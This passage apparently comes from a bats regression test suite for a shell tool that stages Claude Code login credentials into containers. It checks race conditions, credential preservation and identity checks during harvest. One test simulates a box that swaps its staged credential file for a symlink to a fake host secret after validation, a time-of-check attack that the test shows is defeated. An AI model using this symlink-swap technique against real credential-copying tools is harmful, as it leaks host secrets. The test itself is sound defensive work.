  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _account_write_file_0600 _account_do_switch b main "$CN" "$TEST_TEMP/proj"
  _account_sync_in "$CN" || true
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "b"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression vnext: an attach during the unpin and staging of a switch waits, then stages the new account" {
  # The other half of the switch's hold. The switch has harvested and is about
  # to pin b and stage it. A switch that let go of the lock after its harvest
  # let the attach read pin a and decide to stage a's newer login. Once that
  # write lands after the switch's own staging, the box runs as a while pinned
  # to b and the next session end harvests a's login into b's store. The switch
  # stages b whatever the staged expiry says, so an attach write that lands
  # BEFORE it is simply replaced. The attach here is held at its write until
  # the switch has returned, as a slower one would be.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_slow_attach() {
    eval "$(declare -f _account_write_file_0600 | sed '1s/^_account_write_file_0600 /_acct_attach_orig_write /')"
    _account_write_file_0600() {
      : > "$TEST_TEMP/race.waiting"
      local i=0
      while [[ ! -e "$TEST_TEMP/switch.done" && $i -lt 1200 ]]; do
        sleep 0.05
        i=$(( i + 1 ))
      done
      _acct_attach_orig_write "$@"
    }
    _account_sync_in "$@"
  }
  # The switch writes the pin right after its harvest.
  _acct_race_on _box_account_write _acct_slow_attach "$CN"
  _account_do_switch b main "$CN" "$TEST_TEMP/proj" > /dev/null 2>&1 || true
  : > "$TEST_TEMP/switch.done"
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "b"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression vnext: a session-end harvest cannot write the new account into the old account's store" {
  # The harvest decided on a's refreshed login, a switch then harvested, pinned b
  # and staged b, and the harvest wrote the staged file as it was by then: b's
  # credential into a's store. The box refreshing again inside that window is
  # replayed too, so a harvest that only wrote its own earlier copy would still
  # roll a back to the older generation.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  # The window opens at the write: the harvest has read both expiries and
  # decided. (The plausibility check runs before that decision, so a hook there
  # would let the harvest see the switch's store and decline instead.)
  eval "$(declare -f _account_write_cred | sed '1s/^_account_write_cred /_acct_race_orig_write_cred /')"
  _account_write_cred() {
    if [[ ! -e "$TEST_TEMP/race.hooked" ]]; then
      : > "$TEST_TEMP/race.hooked"
      _acct_race_cred "$staged" A 2 1789032400000
      _acct_race_start _account_do_switch b main "$CN" "$TEST_TEMP/proj"
    fi
    _acct_race_orig_write_cred "$@"
  }
  _account_sync_out "$CN" || true
  _acct_race_joined
  run cat "$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  assert_output --partial '"accessToken":"at-A2"'
  run cat "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression vnext: an attach during a rename stages from the renamed store" {
  # The rename moves the store before it rewrites the pins. An attach that read
  # the pin in between found no store and removed the box's credential (16 of 63
  # in the band). The store also holds a newer refresh than the box, the way
  # another box pinned to the same account leaves it, so an attach that merely
  # keeps what is staged still fails.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _box_account_write _account_sync_in "$CN"
  _account_rename a c || true
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "c"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-A2"'
}

@test "regression vnext: a box pinned while its account is being removed is never left on a store that is gone" {
  # remove read the pinned boxes, a switch then pinned another box to the same
  # account and the trash took the store from under it. That box's next attach
  # found no store and deleted its staged login.
  _acct_race_setup
  local CN="cleat-race-abcdef12" CN2="cleat-race-abcdef13"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 1 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _account_trash _account_do_switch a main "$CN2" "$TEST_TEMP/proj"
  _account_do_remove a 1 > /dev/null 2>&1 || true
  _acct_race_joined
  run _box_account_read "$CN2"
  assert_output "a"
  run _account_exists a
  assert_success
}

@test "regression vnext: a harvest writes only the bytes it checked, never what the box swaps in afterwards" {
  # The harvest read the staged path for the expiry, again for the token check
  # and again for the copy. Claude blanks both tokens in that file on
  # invalid_grant, and a blank that landed after the check went over the
  # account's only good refresh token. A symlink swapped in after the check had
  # the host-side copy read a host file into the store, and the next attach
  # handed it to the box.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged store secret leg
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  secret="$TEST_TEMP/host-secret.json"
  # A JSON object, because only a JSON object survives the write's validation.
  printf '{"aws_secret_access_key":"FAKE-HOST-SECRET"}\n' > "$secret"
  _box_account_write "$CN" a
  eval "$(declare -f _account_cred_plausible | sed '1s/^_account_cred_plausible /_acct_orig_plausible /')"
  _account_cred_plausible() {
    local rc=0
    _acct_orig_plausible "$@" || rc=$?
    if [[ "$_ACCT_SWAP_LEG" == blank ]]; then
      printf '{"claudeAiOauth":{"accessToken":"","refreshToken":"","expiresAt":0}}\n' > "$staged"
    else
      rm -f "$staged"
      ln -s "$secret" "$staged"
    fi
    return "$rc"
  }
  for leg in blank symlink; do
    _ACCT_SWAP_LEG="$leg"
    _acct_race_cred "$store" A 0 1789003600000
    rm -f "$staged"
    _acct_race_cred "$staged" A 1 1789028800000
    run _account_sync_out "$CN"
    assert_equal "$leg $status" "$leg 0"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A1"'
    refute_output --partial "FAKE-HOST-SECRET"
    # The box drops what it planted and attaches again.
    rm -f "$staged"
    run _account_sync_in "$CN"
    run cat "$staged"
    refute_output --partial "FAKE-HOST-SECRET"
    assert_output --partial '"accessToken":"at-A1"'
  done
}

@test "regression vnext: a switch that cannot take the account lock changes nothing" {
  # A timeout must never fall through to an unlocked write or delete.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 1 1789028800000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  mkdir -p "$CLEAT_ACCOUNTS_DIR/.lock"
  printf 'host %s pid %s at %s\n' "${HOSTNAME:-unknown}" "$$" "$(date +%s)" > "$CLEAT_ACCOUNTS_DIR/.lock/owner"
  _ACCOUNT_LOCK_WAIT_S=0
  run _account_do_switch b main "$CN" "$TEST_TEMP/proj"
  assert_failure
  assert_output --partial "Another cleat command is changing accounts right now."
  assert_output --partial "Nothing was changed"
  run _box_account_read "$CN"
  assert_output "a"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-A1"'
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: the live-session refusal gave a reason Claude Code 2.1.270 does not
# have. The switch said "Swapping the credential under a running session is
# noticed and undone", from a 2.1.267 read that was never run, and the remove
# gave no reason at all. On 2.1.270 the store's mtime change only clears caches:
# the next request goes out on whatever token is there and nothing is written
# back (77 lab runs). The refusal stays, because a running session keeps the
# store path, the account identity and any turn in flight from its start. All
# three refusals now say that.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a live-session refusal never claims Claude Code undoes the swap" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  printf '{"claudeAiOauth":{"accessToken":"at-FAKE","refreshToken":"rt-FAKE","expiresAt":1}}\n' > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  local cn="cleat-proj-abcdef12"
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { return 0; }
  # Shared login to a named one.
  run _account_do_switch work main "$cn" "$TEST_TEMP/proj"
  assert_failure
  refute_output --partial "undone"
  assert_output --partial "only takes a login change in full when it starts"
  # A named one back to the shared login.
  _box_account_write "$cn" work
  run _account_do_switch default main "$cn" "$TEST_TEMP/proj"
  assert_failure
  refute_output --partial "undone"
  assert_output --partial "only takes a login change in full when it starts"
  # Removing the account a live box is pinned to.
  run _account_do_remove work 1
  assert_failure
  assert_output --partial "only takes a login change in full when it starts"
  run _account_exists work
  assert_success
  run _box_account_read "$cn"
  assert_output "work"
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: account rm asked whether a pinned box had a live session only BEFORE
# its "Remove it? [y/N]" question, which can stay on screen indefinitely. A
# session started while it waited had its staged login deleted after the yes,
# and Claude printed "Not logged in" into it.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: account rm asks again whether a session is live after its question" {
  _acct_race_setup
  local cn="cleat-proj-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$cn/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 1 1789028800000
  _acct_race_cred "$staged" W 1 1789028800000
  _box_account_write "$cn" work
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { [ -e "$TEST_TEMP/session-started" ]; }
  _is_interactive() { return 0; }
  # The session starts while the question is on screen.
  _ask_yn() { : > "$TEST_TEMP/session-started"; printf -v "$1" '%s' y; }
  run _account_do_remove work 0
  assert_failure
  assert_output --partial "only takes a login change in full when it starts"
  refute_output --partial "Removed"
  run _account_exists work
  assert_success
  run _box_account_read "$cn"
  assert_output "work"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-W1"'
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: a switch polled the outgoing account's usage (up to 3 s of curl)
# between its harvest and the staging of the incoming login. A refresh the box
# saved in that window was deleted by the staging without ever being harvested.
# The poll now runs after the staging and outside the account lock.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a switch finishes staging before it waits on the usage API" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/old/.credentials.json" O 1 1789028800000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/new/.credentials.json" N 0 1789025200000
  _acct_race_cred "$staged" O 1 1789028800000
  _box_account_write "$CN" old
  eval "$(declare -f _account_sync_in_locked | sed '1s/^_account_sync_in_locked /_acct_orig_sync_in_locked /')"
  _account_sync_in_locked() { echo "stage" >> "$TEST_TEMP/order"; _acct_orig_sync_in_locked "$@"; }
  _account_usage_fetch() {
    if grep -q '"accessToken":"at-N0"' "$staged" 2>/dev/null; then
      echo "usage staged=new" >> "$TEST_TEMP/order"
    else
      echo "usage staged=old" >> "$TEST_TEMP/order"
    fi
    return 1
  }
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$TEST_TEMP/order"
  # The first line is the staging, and every usage request found the new login
  # already staged.
  assert_line --index 0 "stage"
  assert_output --partial "usage staged=new"
  refute_output --partial "usage staged=old"
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: writers that created an account, and an attach that deleted a login.
#
# The harvest and the metadata writer both began with a mkdir -p of the store,
# so one that finished after `cleat account rm` in another terminal put the
# account back under its old name, and `restore` then refused. Only the
# explicit switch to a new name creates a store now.
#
# The attach removed the staged credential whenever the account store was
# empty. A /login made inside a pinned box lives only in that file until a
# session end harvests it, and `cleat shell` and `cleat login` never do, so the
# next attach threw the login away and the Claude still running on it printed
# "Not logged in". The attach harvests instead and stages nothing back.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression vnext: a session-end harvest that loses the race with account rm does not recreate the account" {
  _acct_race_setup
  local CN="cleat-race-abcdef12"
  # With the store gone the harvest no longer sees the same grant, so the server
  # is asked, and it vouches: the harvest reaches its write.
  _acct_ident_profile "$_ACCT_UUID_A" a@example.com
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789003600000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" A 1 1789007200000
  _box_account_write "$CN" a
  # The remove lands where the lab's stalled session end sat: after the harvest
  # decided, before it wrote. It runs in-process, nested in the harvest's hold.
  eval "$(declare -f _account_cred_plausible | sed '1s/^_account_cred_plausible /_acct_orig_plausible /')"
  _account_cred_plausible() {
    if [[ ! -e "$TEST_TEMP/rm.done" ]]; then
      : > "$TEST_TEMP/rm.done"
      _account_do_remove a 1 > /dev/null 2>&1 || true
    fi
    _acct_orig_plausible "$@"
  }
  _account_sync_out "$CN" || true
  run test -e "$TEST_TEMP/rm.done"
  assert_success
  run test -e "$CLEAT_ACCOUNTS_DIR/a"
  assert_failure
  run _account_do_restore a
  assert_success
  # What comes back is the remove's own harvest of the box's refresh.
  run cat "$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  assert_output --partial '"accessToken":"at-A1"'
}

@test "regression vnext: an unharvested login in a pinned box survives the next attach while its account store is empty" {
  _acct_race_setup
  _account_box_ready() { return 0; }
  local mode cn staged store
  # The store has no refresh token to match, so the server names the login.
  _acct_ident_profile "$_ACCT_UUID_A" in-box@example.com
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    cn="cleat-login-$mode"
    _account_ensure_dir "fresh-$mode"
    _box_account_write "$cn" "fresh-$mode"
    staged="$(_account_box_auth_dir "$cn")/.credentials.json"
    store="$(_account_cred_path "fresh-$mode")"
    mkdir -p "${staged%/*}"
    # What claude /login inside the box wrote.
    printf '{"claudeAiOauth":{"accessToken":"at-in-box","refreshToken":"rt-in-box-%s","expiresAt":1789028800000,"subscriptionType":"max"}}\n' "$mode" > "$staged"
    ln "$staged" "$TEST_TEMP/staged-$mode.link"
    CLAUDE_ENV=()
    run _account_apply_exec_env "$cn"
    assert_success
    # Same inode: the file the running Claude reads was neither removed nor
    # replaced.
    run test "$staged" -ef "$TEST_TEMP/staged-$mode.link"
    assert_success
    run grep -c "rt-in-box-$mode" "$staged"
    assert_output "1"
    # And it is harvested, so a sibling box on the same account gets it.
    run grep -c "rt-in-box-$mode" "$store"
    assert_output "1"
  done
  unset -f command
  # Offline, the login cannot be verified. It is still never deleted: the harvest
  # says cannot tell (3) and the attach leaves the file as it is.
  _account_profile_curl() { printf '\n000'; }
  cn="cleat-login-offline"
  _account_ensure_dir fresh-offline
  _box_account_write "$cn" fresh-offline
  staged="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${staged%/*}"
  printf '{"claudeAiOauth":{"accessToken":"at-in-box","refreshToken":"rt-in-box-offline","expiresAt":1789028800000,"subscriptionType":"max"}}\n' > "$staged"
  ln "$staged" "$TEST_TEMP/staged-offline.link"
  run _account_sync_out "$cn"
  assert_equal "$status" 3
  CLAUDE_ENV=()
  run _account_apply_exec_env "$cn"
  assert_success
  run test "$staged" -ef "$TEST_TEMP/staged-offline.link"
  assert_success
  run grep -c "rt-in-box-offline" "$staged"
  assert_output "1"
  run test -s "$(_account_cred_path fresh-offline)"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: every deleter trusted a declined harvest.
#
# The harvest returned 0 both when the store already held the staged login and
# when it simply declined a file that was not newer. `cleat rm`, both switches,
# `cleat account rm` and nuke then deleted the staged file. A /login made in the
# box as someone else behind a sibling box's fresher refresh, or a refresh whose
# store write failed, existed nowhere afterwards. A declined login the store
# does not hold is now status 3, and every deleter copies what the harvest did
# not take to accounts/.held first, or deletes nothing.
#
# The same wipes only ever looked at the one staged file of a pinned box. Any
# other credential in run/<cname>/ (a staged file an unpinned box was left with,
# a rollback journal) went with the directory. They are held first too.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-W5) and refreshToken the grant (rt-W).
# ─────────────────────────────────────────────────────────────────────────────
_held_mode() { stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"; }

# $1 box, $2 grant of the store, $3 grant staged in the box (a different login
# that is not newer)
_held_declined_pair() {
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" "$2" 5 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$1/auth/.credentials.json" "$3" 0 1789025200000
  _box_account_write "$1" work
}

@test "regression vnext: cleat rm keeps a staged login its account store does not have" {
  _acct_race_setup
  local mode proj cn
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    proj="$TEST_TEMP/proj-$mode"
    mkdir -p "$proj"
    cn="$(container_name_for "$proj" main)"
    _held_declined_pair "$cn" W "B$mode"
    mock_docker_ps ""
    mock_docker_ps_a "$cn"
    run cmd_rm "$proj"
    assert_success
    assert_output --partial "Kept a login from"
    run test -d "$CLEAT_RUN_DIR/$cn"
    assert_failure
    run grep -rl "rt-B$mode" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    assert_equal "${#lines[@]}" 1
    run _held_mode "${lines[0]}"
    assert_output "600"
    run cat "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
    assert_output --partial '"accessToken":"at-W5"'
  done
  unset -f command
}

@test "regression vnext: switching accounts keeps a refreshed login whose harvest failed" {
  _acct_race_setup
  local CN="cleat-held-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/other/.credentials.json" O 0 1789025200000
  _acct_race_cred "$staged" W 1 1789028800000
  _box_account_write "$CN" work
  # The store write fails, the way a full disk does.
  _account_write_cred() { return 1; }
  run _account_do_switch other main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "Kept a login from"
  run grep -rl '"accessToken":"at-W1"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run cat "$staged"
  assert_output --partial '"accessToken":"at-O0"'
}

@test "regression vnext: going back to the shared login keeps a staged login its account does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_do_switch default main "$CN" "$TEST_TEMP/proj"
  assert_success
  run test -e "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression vnext: removing an account keeps a staged login it does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_do_remove work 1
  assert_success
  run _account_exists work
  assert_failure
  run test -e "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression vnext: nuke keeps a staged login its account does not have" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  mock_docker_ps_a ""
  run cmd_nuke <<< "nuke"
  assert_success
  run test -d "$CLEAT_RUN_DIR"
  assert_failure
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression vnext: a credential journal left in a box auth dir is kept when cleat rm wipes the run dir" {
  _acct_race_setup
  local leg proj cn
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  for leg in pinned unpinned; do
    proj="$TEST_TEMP/proj-$leg"
    mkdir -p "$proj"
    cn="$(container_name_for "$proj" main)"
    if [[ "$leg" == pinned ]]; then
      # The staged file is b's own, so the harvest has nothing to do.
      _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" B 0 1789025200000
      _box_account_write "$cn" b
    fi
    # The only copy of the account the box was switched away from.
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json" "A$leg" 1 1789028800000
    mock_docker_ps ""
    mock_docker_ps_a "$cn"
    run cmd_rm "$proj"
    assert_success
    run test -d "$CLEAT_RUN_DIR/$cn"
    assert_failure
    run grep -rl "rt-A$leg" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    assert_equal "${#lines[@]}" 1
    run _held_mode "${lines[0]}"
    assert_output "600"
  done
  # And b's own login was never held.
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_failure
}

@test "regression vnext: cleat nuke keeps a credential journal from a box that is not pinned" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/.prev.1789000000" A 1 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" L 0 1789025200000
  mock_docker_ps_a ""
  run cmd_nuke <<< "nuke"
  assert_success
  run test -d "$CLEAT_RUN_DIR"
  assert_failure
  run grep -rl '"refreshToken":"rt-A"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
  run grep -rl '"refreshToken":"rt-L"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

@test "regression vnext: a wipe that cannot keep a credential journal deletes nothing" {
  _acct_race_setup
  local cn
  # Something that is not a directory where the held logins go.
  : > "$CLEAT_ACCOUNTS_DIR/.held"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  for cn in cleat-unpinned-abcdef12 cleat-pinned-abcdef12; do
    if [[ "$cn" == cleat-pinned-abcdef12 ]]; then
      _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" B 0 1789025200000
      _box_account_write "$cn" b
    fi
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json" A 1 1789028800000
    mkdir -p "$CLEAT_RUN_DIR/$cn/clip"
    run _account_wipe_run_dir "$cn"
    assert_success
    assert_output --partial "it holds a login that could not be saved anywhere else"
    run cat "$CLEAT_RUN_DIR/$cn/auth/.cleat-prev.json"
    assert_output --partial '"accessToken":"at-A1"'
    run test -d "$CLEAT_RUN_DIR/$cn/clip"
    assert_success
  done
  run test -e "$CLEAT_ACCOUNTS_DIR/.lock"
  assert_failure
}

@test "regression vnext: an attach keeps a login the store does not have before staging over it" {
  _acct_race_setup
  local CN="cleat-held-abcdef12"
  _held_declined_pair "$CN" W B
  run _account_sync_in "$CN"
  assert_success
  assert_output --partial "Kept a login from"
  run cat "$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  assert_output --partial '"accessToken":"at-W5"'
  run grep -rl '"refreshToken":"rt-B"' "$CLEAT_ACCOUNTS_DIR/.held"
  assert_success
}

# adopt, the recovery for everything above, swapped only the store file. A box
# pinned to that account still had the old login staged, fresher than the one
# adopted. The next session end wrote it straight back. The held entry was
# already gone, so the adopted login existed nowhere.
@test "regression vnext: a login adopted into an account a box is pinned to survives the next harvest" {
  _acct_race_setup
  local CN="cleat-held-abcdef12" mode staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" "W$mode" 5 1789028800000
    # A refresh the box saved that no session end has harvested yet.
    _acct_race_cred "$staged" "W$mode" 6 1789032400000
    _box_account_write "$CN" work
    _acct_race_cred "$TEST_TEMP/held-src.json" "Y$mode" 0 1789007200000
    _account_hold "$TEST_TEMP/held-src.json" "" cleat-other-abcdef12 left-in-box
    run _account_do_adopt "$_ACCOUNT_HELD_ID" work
    assert_success
    # The next session end on the pinned box.
    run _account_sync_out "$CN"
    assert_success
    run grep -c "rt-Y$mode" "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
    assert_output "1"
    # The refresh the box had is kept, never written back and never lost.
    run grep -rl "\"accessToken\":\"at-W${mode}6\"" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    # And the next attach stages the adopted login.
    run _account_sync_in "$CN"
    assert_success
    run grep -c "rt-Y$mode" "$staged"
    assert_output "1"
  done
  unset -f command
}

# ─────────────────────────────────────────────────────────────────────────────
# vnext: a harvest had no identity check.
#
# The session-end harvest wrote a staged login over the pinned account's store
# on "newer and plausible" alone. The staged file sits in a directory the box
# writes, so a /login as someone else inside a pinned box put that other
# account's login over the account's only credential, with no trash. The list
# kept the old name while usage went out on the other bearer. Separately, a
# switch stamped the account it was leaving with whatever email the box's
# per-project claude.json held, and printed it as fact.
#
# A newer login is written now only when it is the same grant (the same refresh
# token), or GET /api/oauth/profile names the account uuid recorded for the
# store, or on first use the server's email is not a different one than the
# account shows. A login proven to be someone else's is held. One nobody could
# verify is left in place, and a deleter holds it.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-A1) and refreshToken the grant (rt-A).
# ─────────────────────────────────────────────────────────────────────────────
_ACCT_UUID_A="11111111-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
_ACCT_UUID_B="22222222-bbbb-4bbb-8bbb-bbbbbbbbbbbb"

# The profile request answers 200 with this account. $1 uuid, $2 email, $3 org.
_acct_ident_profile() {
  _ACCT_IDENT_BODY="$(printf '{"account":{"uuid":"%s","email":"%s","full_name":"Lab"},"organization":{"uuid":"org-1","name":"%s","cc_onboarding_flags":{}}}' "$1" "$2" "${3:-Lab Org}")"
  _account_profile_curl() { printf '%s\n200' "$_ACCT_IDENT_BODY"; }
}

@test "regression vnext: a login for another account is never harvested over the pinned credential" {
  _acct_race_setup
  local mode cn store
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    cn="cleat-ident-$mode"
    store="$CLEAT_ACCOUNTS_DIR/a-$mode/.credentials.json"
    _acct_race_cred "$store" A 0 1789003600000
    printf 'uuid\t%s\nwho\tlab-a@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/a-$mode/meta"
    _box_account_write "$cn" "a-$mode"
    # /login as B inside the box.
    _acct_race_cred "$CLEAT_RUN_DIR/$cn/auth/.credentials.json" "B$mode" 1 1789028800000
    _acct_ident_profile "$_ACCT_UUID_B" lab-b@lab.invalid "Org B"
    run _account_sync_out "$cn"
    assert_equal "$mode $status" "$mode 2"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A0"'
    run grep -rl "\"refreshToken\":\"rt-B$mode\"" "$CLEAT_ACCOUNTS_DIR/.held"
    assert_success
    run _account_meta_get_at "${lines[0]%/.credentials.json}" who
    assert_output "lab-b@lab.invalid"
    run _account_meta_get "a-$mode" who
    assert_output "lab-a@lab.invalid"
  done
  unset -f command
}

@test "regression vnext: first use never records a login whose email differs from the one the account shows" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  printf 'who\talice@example.com\n' > "$CLEAT_ACCOUNTS_DIR/a/meta"
  _box_account_write "$CN" a
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" B 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_B" bob@example.com
  run _account_sync_out "$CN"
  assert_equal "$status" 2
  run cat "$store"
  assert_output --partial '"accessToken":"at-A0"'
  run _account_meta_get a who
  assert_output "alice@example.com"
  run _account_meta_get a uuid
  assert_failure
  # The same person's login under a differently cased email is theirs: saved,
  # and the uuid is recorded from then on.
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" C 1 1789028800000
  _acct_ident_profile "$_ACCT_UUID_A" Alice@Example.COM
  run _account_sync_out "$CN"
  assert_success
  run cat "$store"
  assert_output --partial '"accessToken":"at-C1"'
  run _account_meta_get a uuid
  assert_output "$_ACCT_UUID_A"
}

# A store with no recorded uuid had only ever been taken on trust: saved before
# the check, adopted from an entry nobody verified, or one whose uuid was never
# written. Its first verified harvest wrote whatever login the box held over it
# with no copy anywhere, so a /login as someone else still replaced the only
# credential. The store's own login is held first now, and a store login that
# cannot be kept stops the write.
@test "regression vnext: a first verified harvest holds the login it writes over" {
  _acct_race_setup
  local CN="cleat-ident-abcdef12" store staged
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$store" A 0 1789003600000
  _box_account_write "$CN" a
  # /login as B inside the box, before the account ever had a verified harvest.
